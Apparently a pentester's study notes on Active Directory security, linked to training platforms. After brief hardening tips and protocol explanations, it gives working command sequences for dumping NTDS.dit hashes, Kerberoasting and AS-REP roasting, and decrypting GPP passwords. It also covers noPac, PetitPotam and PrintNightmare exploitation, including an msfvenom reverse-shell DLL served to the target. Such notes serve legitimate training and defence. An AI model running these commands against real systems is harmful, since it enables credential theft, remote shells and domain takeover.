# Active Directory Security

<div class="row row-cols-lg-2"><div>

**Common good practices**

* 🔒 An account inside the Domain Admins group should be used instead of the Administrator account which should be disabled.
* 🔑 Limit the use of administrative accounts
* 🗺️ Do not name your server after its function <small>(i.g. SQL_SERVER)</small>
* 🌍 Do not name a workstation after its business unit <small>(i.g. sales-xxx)</small>
* 🏠 Do not use easy to guess usernames <small>(i.g. firstname.lastname)</small>
* 🪺 Add the fewest services on your DC <small>(i.g. no ISS/WSUS...)</small>
</div><div>

* 🏄‍♂️ Install the least ISS modules
* 🛡️ Use a strong password policy

</div></div>

<hr class="sep-both">

## Authentication & Authorization

<div class="row row-cols-lg-2"><div>

#### Active Directory database

[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

Active directory database is stored on the domain controller at `%SystemRoot%\ntds\ntds.dit`. It's used to validate credentials.

It contains user/computer/group accounts, group policies, etc.

To copy this database, we either need local administrative or domain administrative privileges. We can use [VSS](/operating-systems/windows/security/index.md#volume-shadow-copy-service-vss).

You can use commands that are only available on Windows Server:

```shell!
CMD> vssadmin CREATE SHADOW /For=C:
CMD> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit %temp%\NTDS.dit
```

You can also use [cme](/cybersecurity/red-team/tools/cracking/auth/cme.md)/[nxc](/cybersecurity/red-team/tools/cracking/auth/nxc.md) which automatically dump it:

```ps
$ nxc smb IP -u 'username' -p 'password' --ntds
```

<br>

#### SYSVOL Network Share

[![adenumeration](../../../../cybersecurity/_badges/thm/adenumeration.svg)](https://tryhackme.com/r/room/adenumeration)

There is a network share on the domain controller: `dir <DCIP>\SYSVOL` associated with the folder `C:\Windows\SYSVOL\sysvol\`.

It's used to store [GPO](/operating-systems/cloud/active-directory/_knowledge/index.md#permissions) and logon/logoff scripts while for the latter, the `NETLOGON` share may be used instead.
</div><div>

#### NTLM

[![adenumeration](../../../../cybersecurity/_badges/thm/adenumeration.svg)](https://tryhackme.com/r/room/adenumeration)

When using a domain such as `\\domain`, Kerberos Authentication is used. When using an IP such as `\\IP`, NTLM may be used instead.

#### NetNTLM

NetNTLM is a challenge-response protocol based on NTLM.

#### Kerberos

[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)

Kerberos is a protocol used to provide secure authentication over non-secure networks. It replaces NTLM and NetNTLM.

**Port(s)** 🐲: 88 <small>(TCP)</small>

When a user logs in, their password is hashed and sent to Kerberos server along with the timestamp for verification. Upon successful login, the server generates a **ticket-granting ticket (TGT)** 🎫.

When the user wants to access a network resource, such as a shared folder or a database, the computer requests a ticket from the Key Distribution Center (KDC) using the TGT. If the request is accepted, the KDC will give them a **Ticket Granting Service (TGS)** 🎟️ that they can use solely for the requested service.

```ps
PS> klist # list current tickets available
```
</div></div>

<hr class="sep-both">

## AD Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

According to our current situation, the techniques we use differ:

* 🐲 We are running Windows or Linux
* 🔐 We are connected to the internal network or not
* 🏘️ Our foothold is connected to AD or not

📚 We often find the Domain Controller IP and use it as the target of every other request, such as SMB requests, etc.

<br>

#### Pentester — External Access

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![breachingad](../../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)

If we have an access, anonymous or not, to [SMB](/operating-systems/networking/protocols/smb.md), we may find the domain name or expose the [Password Policy](/cybersecurity/red-team/s2.discovery/techniques/passwords/policy.md).

If we have write access to a [SMB](/operating-systems/networking/protocols/smb.md) share, we can perform a [SCF Upload Attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) where we receive the user hash when they open the share.

We can perform a [password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md) attack:

* 🚪 Exposed RDP/RDS, SMB, etc. service
* 📮 Exposed [Outlook Web App (OWA)](https://www.microsoft.com/en-us/microsoft-365/outlook/web-email-login-for-outlook) login portal
* 🏭 Exposed Microsoft 0365, Exchange, and Skype
* 🌍 VPN portals <small>(Citrix, SonicWall, OpenVPN, Fortinet using AD Auth)</small>
* 🔑 Websites and applications using [LDAP](#pentester--ldap-access) or NetNTLM.
* 🖨️ Exposed printers using [LDAP](#pentester--ldap-access)
* ...

<br>

#### Pentester — LDAP access

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![breachingad](../../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)

In an [LDAP](/operating-systems/networking/protocols/ldap.md) environment such as Active Directory, we can use:

```ps
$ ldapsearch -h IP -x -b "dc=example,dc=com" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
$ ldapsearch -h IP -x -b "dc=example,dc=com" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
$ python windapsearch.py --dc-ip IP -u "" -U
```

Some websites, which may be exposed to the outside, may use LDAP for authentication, so we can try [password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md) on them.

If we can compromise a target host connected to AD, such as a GitLab server, we may find credentials in configuration files.

We may be able to perform a [LDAP Pass-back Attack](/operating-systems/networking/protocols/ldap.md#ldap-pass-back-attack).

Look for passwords stored using [reversible encryption](#passwords-stored-using-reversible-encryption)

<br>

#### Pentester — Kerberos access

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)

We can use [kerbrute](/cybersecurity/red-team/tools/utilities/windows/kerbrute.md) to enumerate users:

```ps
$ kerbrute userenum -d domain --dc IP wordlist
```

We can perform a [password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md) attack.

We can perform a [kerberoasting attack](#kerberoasting--privilege-escalation) <small>(credentials required 🔑)</small>

We can perform a [ASReproasting attack](#as-rep-roasting-attack--privilege-escalation) <small>(no credentials required ✅)</small>
</div><div>

#### Pentester — Internal access

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![breachingad](../../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)

We should be able to exploit every other technique and:

* [Passive Internal Network Discovery](/cybersecurity/red-team/s1.investigation/techniques/passive_network_discovery.md): find hosts
* [LLMNR/NBT-NS Poisoning](/cybersecurity/red-team/s2.discovery/techniques/network/poisoning.md): attack to expose credentials
* [Password Policy](/cybersecurity/red-team/s2.discovery/techniques/passwords/policy.md): expose the password policy
* [Insecure PXE boot](#preboot-execution-environment-pxe): get credentials if exploitable
* [Dangerous privileges](/cybersecurity/red-team/s4.privesc/windows/topics/privs.md) or [ACEs](/cybersecurity/red-team/s4.privesc/windows/topics/privs.md#windows-dangerous-aces): a vector that can get us credentials, access to another account, or compromise the whole environment.
* [Windows Identification](/cybersecurity/red-team/s4.privesc/windows/utils/id.md): use built-in tools and functions of Windows or well-known scripts to find information.

You can use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloodhound.md) to collect and analyze information to find attack vectors and attack paths.

Additional configurations:

* [Accounts With PASSWD_NOTREQD](#password-not-required): easily compromised?
* [Accounts With Reversible Passwords](#password-not-required): gain access

<br>

#### Pentester — Not Joined To AD

[![breachingad](../../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
[![adenumeration](../../../../cybersecurity/_badges/thm/adenumeration.svg)](https://tryhackme.com/r/room/adenumeration)

If you are on a host connected to the internal network but not AD, you need to configure the DNS and pass additional options to most tools.

```shell!
$ nmcli connection # find NIC uid (note: eth0 not tun0)
$ nmcli connection modify uid ipv4.dns $DCIP
$ nmcli connection modify uid ipv4.dns-search domain
$ nmcli connection up uid # restart
$ nslookup dc1.domain # test if it works
$ ping $DCIP ; ping dc1.domain # both should work
```

On Windows, with administrator privileges, you can use:

```ps
PS> $index = Get-NetAdapter -Name '<NIC_NAME>' | Select-Object -ExpandProperty 'ifIndex'
PS> Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses "<DCIP>"
```

On Windows, use `runas /netonly` to provide AD credentials.

```ps
$ runas.exe /netonly /user:domain\username cmd.exe # provide the password, credentials are not verified
```

Now, we can run tools such as `MS SQL` or commands as usual.

📚 Refer to [pivoting](/cybersecurity/red-team/s5.post-exploitation/index.md#pivoting-to-another-host-) to access internal hosts from a pivot host.
</div></div>

<hr class="sep-both">

## AD Pentester Attack Notes ☠️

<div class="row row-cols-lg-2"><div>

#### Dump Secrets From Active Directory database

[![windows_privilege_escalation](../../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
[![windows_ntds_secret_extraction](../../../../cybersecurity/_badges/rootme/forensic/windows_ntds_secret_extraction.svg)](https://www.root-me.org/en/Challenges/Forensic/Windows-NTDS-Secret-extraction)

The active directory, similarly to the SAM database, is partially encrypted using a [bootkey](/operating-systems/windows/security/index.md#syskey-bootkey-and-system-hive) stored in the SYSTEM registry.

You can [dump the SYSTEM registry hive](/operating-systems/windows/security/index.md#dump-credentials-from-the-sam-database) using:

```shell!
PS> reg save hklm\system C:\XXX\system.hive
```

You can use impacket [secretsdump](/operating-systems/networking/protocols/tools/impacket.md#secretsdump) script to dump its contents.

```shell!
$ impacket-secretsdump -system ./system.hive -ntds ./ntds.dit LOCAL -outputfile cracked
$ grep "krbtgt" cracked.ntds.kerberos # kerberos tickets
```

You could also do it remotely:

```shell!
$ impacket-secretsdump -dc-ip IP -just-dc sdomain/username:password@IP
```

You could also use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ⭐)</small>:

```ps
PS> Import-Module .\DSInternals.psd1
PS> $key = Get-BootKey -SystemHiveFilePath '.\system.hive'
PS> Get-ADDBAccount -All -DatabasePath .\ntds.dit -BootKey $key
```

You can use [NtdsAudit](https://github.com/dionach/NtdsAudit) <small>(0.4k ⭐)</small> on Windows or [DPAT](https://github.com/clr2of8/DPAT) <small>(0.9k ⭐, 2022 🪦)</small> Python Script for statistics.

<br>

#### Preboot Execution Environment (PXE)

[![breachingad](../../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)

Preboot Execution Environment (PXE) can be used to allow devices to install the operating system defined by [MDT](/operating-systems/cloud/active-directory/_knowledge/index.md#microsoft-deployment-toolkit-mdt) on their machine when it connects to the network. 

* During DHCP, we receive the MDT server IP
* We need the BCD filenames, located on `/tmp/` on the MDT server
* Determine the PXE Boot Image Location from the BCD
* Use TFTP to download the boot image
* Analyze it and find secrets?

We can use [powerpxe](https://github.com/wavestone-cdt/powerpxe) <small>(0.1k ⭐)</small>.

```
PS> powershell -executionpolicy bypass
PS> Import-Module .\PowerPXE.ps1
PS> # Example: manually execute some steps
PS> Get-WimFile -bcdFile "conf.bcd"
PS> tftp -i MDTIP GET "PXE Boot Image Location" pxeboot.wim
PS> Get-FindCredentials -WimFile pxeboot.wim
```

This is usually after the DHCP lease using TFTP.

<br>

#### Group Policy Preferences (GPP)

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![active_directory_gpo](../../../../cybersecurity/_badges/rootme/forensic/active_directory_gpo.svg)](https://www.root-me.org/en/Challenges/Forensic/Active-Directory-GPO)

Group Policy Preferences (GPP) are stored within GPOs. They can be used to make settings persist even if GPOs are removed.

Passwords may be stored in GPP, but the encryption algorithm is reversible, so it's a known insecure practice.

The `cpassword` attribute contains the encrypted password.

You can use impacket or [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) <small>(0.1k ⭐)</small>:

```shell!
$ impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL
```

➡️ Look at: `\<domain>\SYSVOL\<domain>\Policies\<GPO GUID>\Machine\Preferences\Groups\Groups.xml`.

➡️ You can try to find them using [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), metasploit, or nxc with the `gpp_autologin` module.
</div><div>

#### Password Not Required

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

Some users may have the `PASSWD_NOTREQD` attribute set. It means they can have a password that is not compliant to the password policy and even a blank password if it is allowed.

```ps
PS> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol # PowerView
```

<br>

#### Passwords Stored Using Reversible Encryption

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

It's possible for some user accounts to have their passwords stored using reversible encryption for some specific use cases. The registry SYSKEY value is required to decrypt them.

```ps
PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl # AD Module
PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol # PowerView
```

📚 Using LDAP, search for users with `userAccountControl>=128`.

<br>

#### AS-REP Roasting Attack — Privilege Escalation

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
[![windows_ldap_user_asreproastable](../../../../cybersecurity/_badges/rootme/forensic/windows_ldap_user_asreproastable.svg)](https://www.root-me.org/en/Challenges/Forensic/Windows-LDAP-User-ASRepRoastable)

*Alternative name: ASReproasting*

Some kerberos users may have been configured to not require Kerberos Pre Auth, leading to their hash being sent when an authentication request is made before providing valid identification.

```shell!
$ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
PS> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
PS> .\Rubeus.exe asreproast /user:cn /nowrap /format:hashcat
```

Refer to [cracking Kerberos Pre Auth Hash](/cybersecurity/cryptography/algorithms/hashing/index.md#kerberos-pre-auth-cracking).

📚 Using LDAP, search for users with `userAccountControl>=4194304`.

<br>

#### Kerberoasting — Privilege Escalation

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![windows_ldap_user_kerberoastable](../../../../cybersecurity/_badges/rootme/forensic/windows_ldap_user_kerberoastable.svg)](https://www.root-me.org/en/Challenges/Forensic/Windows-LDAP-User-KerbeRoastable)

Domain accounts are often used to run services. They may have been given many privileges. Each service instance is associated with a service account using a **Service Principal Names (SPN)**.

We can request a TGS for the target service, and attempt to crack its hash. RC4 hashes are easy to crack while AES hashes are harder.

We can use [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md), [Rubeus](/cybersecurity/red-team/tools/utilities/creds/rubeus.md) or [PowerView](/cybersecurity/red-team/tools/utilities/windows/powersploit.md) to fetch TGS tickets.

```shell!
$ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request # get TGS for all
$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request-user cn -outputfile cn_tgs # get TGS for 'cn'
```

```shell!
PS> setspn.exe -Q */* # list all (ignore computer accounts)
PS> setspn.exe -T domain -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } # get TGS for all
```

```shell!
mimikatz# kerberos::ask /target:cn # request TGS for cn
mimikatz# base64 /out:true
mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
```

```shell!
PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
PS> Get-DomainUser cn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes # encryption scheme
PS> Get-DomainUser -Identity cn | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\xxx.csv -NoTypeInformation
```

```shell!
PS> .\Rubeus.exe kerberoast /stats # number of SPNs, encryption types
PS> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
PS> .\Rubeus.exe kerberoast /user:cn /nowrap # cn encryption settings
PS> .\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap # try a downgrade attack
```

Some tools can try to perform a downgrade attack from AES to RC4. It won't work as of Windows Server 2019.

Refer to [cracking Kerberos Tickets](/cybersecurity/cryptography/algorithms/hashing/index.md#kerberos-tickets-cracking).

📚 Using LDAP, search for users with `servicePrincipalName` set.

📚 Refer to "Managed Service Accounts" for remediation (LAPS).

📚 More tools: [kerberoast](https://github.com/nidem/kerberoast) <small>(1.3k ⭐)</small>, [RiskySPN](https://github.com/cyberark/RiskySPN) <small>(0.3k ⭐)</small>
</div></div>

<hr class="sep-both">

## AD Pentester CVE Notes ☠️

<div class="row row-cols-lg-2"><div>

#### noPac Exploit (SamAccountName Spoofing)

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

The noPac exploit is based on [CVE-2021-42278](https://nvd.nist.gov/vuln/detail/CVE-2021-42278) and [CVE-2021-42287](https://nvd.nist.gov/vuln/detail/CVE-2021-42287). The first one is used to bypass UAC while the second targets [PAC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/c38cc307-f3e6-4ed4-8c81-dc550d96223c).

We need to change the `SamAccountName` a computer account to match the one of a domain controller `SamAccountName`. Any authenticated user can register up to `ms-DS-MachineAccountQuota` hosts, `10` by default.

```shell!
$ DEST="$HOME/tools/noPac"
$ git clone -b "main" https://github.com/Ridter/noPac.git $DEST
$ python3 $DEST/scanner.py domain/username:password -dc-ip IP -use-ldap # Test, get a TGT
$ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 -shell --impersonate administrator -use-ldap # impersonate DC01
$ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user domain/administrator # DCSync, Dump Hashes/Tickets
```

<br>

#### PrintNightmare

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

The PrintNightmare vulnerability is based on [CVE-2021-1675](https://nvd.nist.gov/vuln/detail/CVE-2021-1675) and [CVE-2021-34527](https://nvd.nist.gov/vuln/detail/CVE-2021-34527). Both are targeting the Print Spooler service.

```shell!
$ impacket-rpcdump @DCIP | egrep 'MS-RPRN|MS-PAR' # POC? 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

```shell!
$ # start a handler on port 4444 to catch:
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o shell.dll
$ impacket-smbserver -smb2support share .
```

```shell!
$ DEST="$HOME/tools/PrintNightmare"
$ git clone -b "main" https://github.com/cube0x0/CVE-2021-1675.git $DEST
$ python3 $DEST/CVE-2021-1675.py domain/username:password@IP '\\HOST_IP\share\shell.dll'
```
</div><div>

#### PetitPotam

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

PetitPotam is based on [CVE-2021-36942](https://nvd.nist.gov/vuln/detail/CVE-2021-36942). An authenticated attacker could connect using NTLM over port 445 by abusing MS-EFSRPC.

If the server runs AD CS, then the hacker can exploit it to eventually get a TGT for the Domain Controller and compromise the domain.

Refer to [this article](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/).

```ps
$ impacket-ntlmrelayx -debug -smb2support --target http://target/certsrv/certfnsh.asp --adcs --template DomainController
$ git clone https://github.com/topotam/PetitPotam.git
$ cd PetitPotam
$ python3 PetitPotam.py HACKER_IP DCIP
```
```shell!
mimikatz# misc::efs /server:DCIP /connect:HACKER_IP
```

➡️ See also: [Invoke-Petitpotam.ps1](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-Petitpotam.ps1).

➡️ See also: [PKINITtools](https://github.com/dirkjanm/PKINITtools) <small>(0.6k ⭐)</small> to get a TGT from a certificate:

```ps
$ python3 gettgtpkinit.py example.com\COMPUTE_ACCOUNT_NAME\$ -pfx-base64 ...SNIP... xxx.ccache
$ # use ccache file or request a TGS with the user hash
$ python3 getnthash.py -key <from gettgt> example.com\COMPUTE_ACCOUNT_NAME\$
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* prevent access to dangerous websites
* [adPEAS](https://github.com/61106960/adPEAS) <small>(0.4k ⭐)</small>
* [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList) <small>(1.5k ⭐)</small>
* [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) <small>(3.4k ⭐)</small>
* [AD mindmap orange](https://orange-cyberdefense.github.io/ocd-mindmaps/)
* [bloodyAD](https://github.com/CravateRouge/bloodyAD)+[autobloody](https://github.com/CravateRouge/autobloody)
* Advanced Security Audit Policy
</div><div>

* Hardening AD ([ref](https://blog.netwrix.fr/2019/05/06/securiser-votre-annuaire-ad-contre-les-attaques-de-malware/))
* [kerberos/AD cyber](https://zer1t0.gitlab.io/posts/)

<details class="details-n">
<summary>Configure BitLocker</summary>

* Also in Windows Security
* Network Unlock

**1)** The first part is installing BitLocker on the server:

* Start the Server Manager
* Click on "Add roles and features"
* Press Next thrice
* In Features, select BitLocker

**2)** Then we need to configure it:

* Go to Tools > Group Policy Management
* Right-click on a GPO > Edit <small>(you could create a GPO and apply it on the whole domain, or a GPO only for some OUs...)</small>
* Navigate to "Computer Configuration" > "Policies" > "Administrative Templates" > "Windows Components" > "BitLocker Drive Encryption"
* ~~Enable the "Turn on BitLocker"~~
* Go Navigate to "Operating system drives"
* Enable the "Require additional authentication at startup"
    * Select "Allow BitLocker without a compatible TPM"
    * Select "Do not allow startup PIN with TPM"
* Enable "Choose how BitLocker-protected operating system drives can be recovered"
    * Select the "Save BitLocker recovery information to AD DS for operating system drives"
* Navigate back to parent
* ~~Configure "Choose drive encryption method and cipher strength" <small>(encryption method, cipher strength...)</small>~~

**3)** On the Windows 10, you need to use a local administrator account, refer to the "Get started" section if needed.

* Open a powershell/CMD as an administrator
* Enter "gpedit.msc"
* Navigate to "Computer Configuration" > "Administrative Templates" > "Windows Components" > "BitLocker Drive Encryption"
* ...
* Restart

Then, right-click on the drive to encrypt, select "Bitlocker", and encrypt it. If prompted for a password when starting the workstation, then something went wrong in your configuration.
</details>

<details class="details-n">
<summary>Notes to configure TCP/IP parameters</summary>

You can either use the Windows Registry, or a group policy. Here are some parameters that you may want to set.

* SynAttackProtect <small>(SYN flood attacks)</small>
* EnableDeadGWDetect <small>(Detect dead gateways)</small>
* EnablePMTUdiscovery <small>(Avoid fragmentation...)</small>
* KeepAliveTime <small>(Timeout for inactive connections)</small>
* TCPMaxPortsExhausted <small>(Prevent from exhausting ports)</small>
* PerformRouterDiscovery <small>(Can simply the configuration but allow attackers to set up rogue routers/... to redirect traffic)</small>
* NoNameReleaseOnDemand <small>(Release the NetBios name when no longer needed to prevent attacker from obtaining information)</small>
* TcpMaxConnectResponseRetransmissions <small>(can help to prevent SYN flood attacks, but may exhaust system resources)</small>
</details>

* Passwords stored in cleartext in group policy? in user desc?
</div></div>